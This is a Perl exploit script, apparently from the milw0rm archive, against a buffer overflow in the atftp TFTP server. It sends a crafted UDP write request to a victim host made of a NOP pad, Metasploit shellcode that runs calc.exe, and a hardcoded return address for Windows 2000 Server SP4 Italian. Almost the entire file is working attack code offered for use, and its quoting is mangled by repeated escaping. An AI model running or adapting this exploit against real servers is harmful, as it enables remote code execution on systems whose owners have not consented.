#!/usr/bin/perl -w
#acaro[at]jervus.it
#http://www.securityfocus.com/bid/21320
#
# liuqx@nipc.org.cn is credited with the discovery of this vulnerability



use IO::Socket;

if(!($ARGV[1]))
{
 print \\\"Uso: atftp-19.pl <victim> <port>\\\\n\\\\n\\\";
 exit;
}



$victim = IO::Socket::INET->new(Proto=>\\\'udp\\\',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die \\\"Cannot connect to $ARGV[0] sulla porta $ARGV[1]\\\";
$pad = \\\"\\\\x90\\\"x63;

# win32_exec -  EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com

$shellcode = \\\"\\\\x33\\\\xc9\\\\x83\\\\xe9\\\\xdd\\\\xd9\\\\xee\\\\xd9\\\\x74\\\\x24\\\\xf4\\\\x5b\\\\x81\\\\x73\\\\x13\\\\xf1\\\".
\\\"\\\\xf1\\\\x59\\\\x06\\\\x83\\\\xeb\\\\xfc\\\\xe2\\\\xf4\\\\x0d\\\\x19\\\\x1d\\\\x06\\\\xf1\\\\xf1\\\\xd2\\\\x43\\\".
\\\"\\\\xcd\\\\x7a\\\\x25\\\\x03\\\\x89\\\\xf0\\\\xb6\\\\x8d\\\\xbe\\\\xe9\\\\xd2\\\\x59\\\\xd1\\\\xf0\\\\xb2\\\\x4f\\\".
\\\"\\\\x7a\\\\xc5\\\\xd2\\\\x07\\\\x1f\\\\xc0\\\\x99\\\\x9f\\\\x5d\\\\x75\\\\x99\\\\x72\\\\xf6\\\\x30\\\\x93\\\\x0b\\\".
\\\"\\\\xf0\\\\x33\\\\xb2\\\\xf2\\\\xca\\\\xa5\\\\x7d\\\\x02\\\\x84\\\\x14\\\\xd2\\\\x59\\\\xd5\\\\xf0\\\\xb2\\\\x60\\\".
\\\"\\\\x7a\\\\xfd\\\\x12\\\\x8d\\\\xae\\\\xed\\\\x58\\\\xed\\\\x7a\\\\xed\\\\xd2\\\\x07\\\\x1a\\\\x78\\\\x05\\\\x22\\\".
\\\"\\\\xf5\\\\x32\\\\x68\\\\xc6\\\\x95\\\\x7a\\\\x19\\\\x36\\\\x74\\\\x31\\\\x21\\\\x0a\\\\x7a\\\\xb1\\\\x55\\\\x8d\\\".
\\\"\\\\x81\\\\xed\\\\xf4\\\\x8d\\\\x99\\\\xf9\\\\xb2\\\\x0f\\\\x7a\\\\x71\\\\xe9\\\\x06\\\\xf1\\\\xf1\\\\xd2\\\\x6e\\\".
\\\"\\\\xcd\\\\xae\\\\x68\\\\xf0\\\\x91\\\\xa7\\\\xd0\\\\xfe\\\\x72\\\\x31\\\\x22\\\\x56\\\\x99\\\\x01\\\\xd3\\\\x02\\\".
\\\"\\\\xae\\\\x99\\\\xc1\\\\xf8\\\\x7b\\\\xff\\\\x0e\\\\xf9\\\\x16\\\\x92\\\\x38\\\\x6a\\\\x92\\\\xdf\\\\x3c\\\\x7e\\\".
\\\"\\\\x94\\\\xf1\\\\x59\\\\x06\\\";

#$eip=\\\"\\\\x42\\\\x42\\\\x42\\\\x42\\\";
$eip=\\\"\\\\xf4\\\\xf5\\\\xe3\\\\x75\\\";	#call [ESP+28] in IMM32.dll on win2k Server SP4 Italian 



$mode = \\\"netascii\\\";

$exploit = \\\"\\\\x00\\\\x02\\\" . $pad . $shellcode . $eip . \\\"\\\\0\\\"  . $mode . \\\"\\\\0\\\";


print $victim $exploit;

print \\\" + Malicious request sent ...\\\\n\\\";

sleep(2);

print \\\"Done.\\\\n\\\";

close($victim);
exit;

# milw0rm.com [2006-12-03]
